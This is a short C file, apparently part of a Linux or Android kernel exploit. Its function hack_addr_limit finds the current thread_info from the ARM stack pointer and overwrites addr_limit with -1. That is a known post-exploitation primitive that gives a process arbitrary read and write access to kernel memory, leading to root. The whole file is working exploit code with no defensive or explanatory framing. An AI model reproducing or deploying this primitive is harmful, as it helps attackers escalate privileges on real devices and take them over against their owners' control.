#include <stdio.h>
#include "exploit_utils.h"

#define THREAD_SIZE             8192

struct thread_info {
  unsigned long flags;
  int preempt_count;
  unsigned long addr_limit;

  /* ... */
};

static inline struct thread_info *
current_thread_info(void)
{
  register unsigned long sp asm ("sp");
  return (struct thread_info *)(sp & ~(THREAD_SIZE - 1));
}

void
hack_addr_limit(void)
{
  struct thread_info *info;

  info = current_thread_info();
  info->addr_limit = -1;
}
